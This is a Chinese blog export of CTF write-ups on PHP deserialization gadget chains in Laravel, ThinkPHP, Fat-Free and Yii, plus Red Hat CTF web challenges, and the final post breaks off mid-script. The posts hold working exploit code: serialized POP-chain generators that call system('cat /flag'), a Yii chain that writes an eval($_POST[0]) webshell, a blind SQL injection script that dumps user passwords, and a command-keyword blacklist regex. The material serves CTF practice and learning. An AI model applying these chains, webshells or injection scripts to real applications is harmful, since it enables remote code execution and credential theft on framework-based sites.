    <url>/2021/05/03/ciscnlaravel/</url>
    <content><![CDATA[<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p>两个exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">PhpArrayTrait</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">        <span class="keyword">private</span> $deferred ;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$pool</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [<span class="string">&quot;exp&quot;</span>=&gt;<span class="keyword">new</span> CacheItem()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">PhpArrayTrait</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">ProxyTrait</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">pool</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> PhpArrayTrait&#123;</span><br><span class="line">        <span class="keyword">private</span> $values = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">private</span> $file = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">PhpArrayAdapter</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">TagAwareAdapter</span>;</span><br><span class="line"></span><br><span class="line">    $phpArray = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">    $Tagwa = <span class="keyword">new</span> TagAwareAdapter($phpArray);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($Tagwa));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这个是包含的，也是市面上大部分的，另外一个是可以命令执行的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Ldap</span>\<span class="title">Adapter</span>\<span class="title">ExtLdap</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$pool</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [<span class="string">&quot;ex&quot;</span>=&gt;<span class="keyword">new</span> CacheItem()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">        <span class="keyword">private</span> $setInnerItem=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> ProxyTrait&#123;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $namespace = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span> = &quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">ProxyAdapter</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">TagAwareAdapter</span>;</span><br><span class="line"></span><br><span class="line">    $pool = <span class="keyword">new</span> ProxyAdapter();</span><br><span class="line">    $tag = <span class="keyword">new</span> TagAwareAdapter($pool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($tag));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>包含的被人讲烂了，这里说说命令执行的这条链。</p>
<p>全局搜索destruct，能够找到</p>
<p><img src="ciscnlaravel/image-20210508110947667.png" alt="image-20210508110947667"></p>
<p>跟进过去很快就可以找到</p>
<p><img src="ciscnlaravel/image-20210508111003685.png" alt="image-20210508111003685"></p>
<p>然后发现调用了一个saveDeferred方法，全局搜索saveDeferred：</p>
<p>找到ProxyAdapter类</p>
<p><img src="ciscnlaravel/image-20210508111149696.png" alt="image-20210508111149696"></p>
<p>跟进doSave方法</p>
<p><img src="ciscnlaravel/image-20210508111233915.png" alt="image-20210508111233915"></p>
<p>这里能够发现很多命令执行的点，但是其实最终落到的地方是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);</span><br></pre></td></tr></table></figure>

<p>先说下踩得坑。一开始我一直在找：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$innerItem = $f(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">&quot;\0*\0key&quot;</span>], <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>但是这样会遇见一个问题，system</p>
<p><img src="ciscnlaravel/image-20210508111609499.png" alt="image-20210508111609499"></p>
<p>第二个参数如果设置为null，则不会回显内容..</p>
<p><img src="ciscnlaravel/image-20210508111726457.png" alt="image-20210508111726457"></p>
<p>这样</p>
<p><img src="ciscnlaravel/image-20210508111744147.png" alt="image-20210508111744147"></p>
<p>而我们可以看见这条语句的第二个参数已经锁死为null了，所以无论如何都是没办法执行system的。</p>
<p>但是后来想到其实可以用assert</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="string">&quot;system(&#x27;dir&#x27;);&quot;</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5.1</title>
    <url>/2021/05/04/thinkphp5-1/</url>
    <content><![CDATA[<h1 id="感觉自己之前写的文章理解还是不够，所以又来写"><a href="#感觉自己之前写的文章理解还是不够，所以又来写" class="headerlink" title="感觉自己之前写的文章理解还是不够，所以又来写"></a>感觉自己之前写的文章理解还是不够，所以又来写</h1><p>如果只是单纯的复现很快就会忘掉，所以需要自己多靠自己再来复现，这次是做n1book上的哪个thinkphp5.1.</p>
<p>找入口能够找到windows.php</p>
<p><img src="image-20210504130710627.png" alt="image-20210504130710627"></p>
<p>找到removeFile，看</p>
<p><img src="image-20210504130931338.png" alt="image-20210504130931338"></p>
<p>然后发现任意文件删除，然而我们不仅仅想要做到这个，想想file_exists能够做什么呢？对吧，还可以找toString来继续看，挨个找（这里我只能说提供思路给大家，因为找这个是相当的繁琐和疲惫的事情，如果按照网上的WP的话就很快，但是往往找POP链就是很累），最终能够锁定Conversion.php</p>
<p><img src="image-20210504131141168.png" alt="image-20210504131141168"></p>
<p>跟过去</p>
<p><img src="image-20210504131156216.png" alt="image-20210504131156216"></p>
<p>再跟过去看toArray。将暂时没用的代码折叠掉，我们发现了一个$relation-&gt;visiible</p>
<p><img src="image-20210504131357627.png" alt="image-20210504131357627"></p>
<p>分析这段代码做的事情：</p>
<ul>
<li>首先重点看看是否可控，首先$name是可控的，$name来自于$this-&gt;append的数组遍历，而该参数我们可以控制，故完全可控</li>
<li>$relation = $this-&gt;getAttr($key)，为此我们需要保证$this-&gt;getRelation($key)返回的内容为空</li>
<li>满足这些条件就可以进入$relation-&gt;visible($name),而name也可以控制，name此时传进去的是一个数组，所以我们全局搜索visible方法，如果不行就找call方法</li>
</ul>
<p>这里先举出其他call方法为什么不用，例如我们可以先找到一个Cache.php</p>
<p><img src="image-20210504132633411.png" alt="image-20210504132633411"></p>
<p>这里的第一个参数就不可控，其他的很多call函数也是类似</p>
<p>最终我们可以在Request.php下找到</p>
<p><img src="image-20210504132522167.png" alt="image-20210504132522167"></p>
<p>hook完全可控，那么最终我们就可以执行system命令了(原本我是这样想的，结果这就尼玛是前面的一小部分，因为这个该死的array_unshift)，让这个链子长了一倍多！</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>fat反序列化挖掘</title>
    <url>/2021/05/08/fat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>自己复现了好几个反序列化的框架漏洞了，自己找个框架练练手，拿fat框架里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unserialize($_GET[<span class="number">0</span>]);</span><br><span class="line">$f3-&gt;run();</span><br></pre></td></tr></table></figure>

<p>随便添加一些</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>红帽三个web</title>
    <url>/2021/05/09/%E7%BA%A2%E5%B8%BD%E4%B8%89%E4%B8%AAweb/</url>
    <content><![CDATA[<h1 id="find-it"><a href="#find-it" class="headerlink" title="find it"></a>find it</h1><p>源码泄露，访问robots.txt,根据提示找到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $link = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background-color: white;</span><br><span class="line">		text-align: center;</span><br><span class="line">		padding: <span class="number">50</span>px;</span><br><span class="line">		font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">#logo &#123;</span></span><br><span class="line">		margin-bottom: <span class="number">40</span>px;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">	&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">if</span>($link) &#123; <span class="meta">?&gt;</span></span><br><span class="line">		&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line">if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>会将输入的东西写入hack.php</p>
<p>审计源码可以发现写入内容会被写入到hack.php直接写入?&gt;&lt;?php phpinfo(); //访问hack.php，搜索flag即可</p>
<p><img src="QQ%E5%9B%BE%E7%89%8720210509184121.png" alt="QQ图片20210509184121"></p>
<p>不知道是不是非预期，flag直接在环境里面了 = =</p>
<h1 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h1><p>简单反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(\&#x27;1.php\&#x27;,&quot;&lt;?php eval(\$_POST[0]);&quot;)&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $keys = [];</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成poc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写入之后执行phpinfo发现ban掉很多函数，利用蚁剑的disable_function 直接绕过即可得到flag</p>
<h1 id="websitemanager"><a href="#websitemanager" class="headerlink" title="websitemanager"></a>websitemanager</h1><p>在image.php 下面直接注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze56uon9iidhta1za8c.cloudeci1.ichunqiu.com/image.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="comment"># sql = &quot;1=(ord(substr(database(),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        sql = <span class="string">&quot;1=(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, j)</span><br><span class="line">        sql = <span class="string">&quot;1=(ord(substr((select(group_concat(password))from(users)),&#123;&#125;,1))&lt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.get(url=url, params=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res.text) &gt; <span class="number">20000</span>:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">125</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>

<p>弱智的ssrf</p>
<p><img src="image-20210509184512861.png" alt="image-20210509184512861"></p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel5.7反序列化</title>
    <url>/2021/05/11/Laravel5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="过期链子"><a href="#过期链子" class="headerlink" title="过期链子"></a>过期链子</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>做反序列化的从destruct出发老生常谈了，直接落到PendingCommand.php下面</p>
<p><img src="image-20210511154243416.png" alt="image-20210511154243416"></p>
<p>跟进run函数，可以看到</p>
<p><img src="Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210511154546839.png" alt="image-20210511154546839"></p>
<p>而app是完全可控的，所以我们就要看怎么冲了，这里会遇见一个问题，mockConsoeOutput无法正常运行完</p>
<p>跟进过去。</p>
<p><img src="image-20210511154731233.png" alt="image-20210511154731233"></p>
<h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>为了让第一部分的代码正常走完我们需要$this-&gt;parameters 为一个数组，</p>
<p>而第二个部分也需要$-&gt;test-&gt;expectedQuestions 为一个数组，但是很明显我们不知道正常的expectedQuestions方法，也懒得去找，我们只希望这段函数能够正常执行就好，所以我们找一个call方法，能够使得我们控制返回结果为数组。</p>
<p>搜索找到</p>
<p><img src="image-20210511155144928.png" alt="image-20210511155144928"></p>
<p>这样的话程序就可以成功走完了，我们又回到这里：</p>
<p><img src="image-20210511155224042.png" alt="image-20210511155224042"></p>
<p>找一个call方法可控的类。一开始我找到的是Generator类，这个类的call方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $attributes</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进format函数</p>
<p><img src="image-20210511155425798.png" alt="image-20210511155425798"></p>
<p>再跟进getFormatter：</p>
<p>咦，美滋滋可控嗷</p>
<p><img src="image-20210511155451553.png" alt="image-20210511155451553"></p>
<h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>结果打了一下发现：<img src="image-20210511155505956.png" alt="image-20210511155505956"></p>
<p>因为wakeup这里给你ban了：</p>
<p><img src="image-20210511155334326.png" alt="image-20210511155334326"></p>
<p>那就只能再找call方法了。</p>
<p>绷不住了，这就你妈离谱，这个人文章写错了，他提供的是5.6版本的把？？？所以这条链其实走到头了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">app</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> $test = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$degen,$Generator</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $Generator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = [<span class="string">&quot;id&quot;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test =$degen ;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command =<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个类用于解决报错问题</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = [];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters = <span class="keyword">array</span>(<span class="string">&quot;bind&quot;</span>=&gt;<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $formatters = <span class="keyword">array</span>(<span class="string">&quot;bind&quot;</span>=&gt;<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>;</span><br><span class="line">    $degen = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">    $Generator = <span class="keyword">new</span> \Faker\<span class="built_in">Generator</span>();</span><br><span class="line">    $pencom = <span class="keyword">new</span> PendingCommand($degen,$Generator);</span><br><span class="line">    <span class="keyword">echo</span> 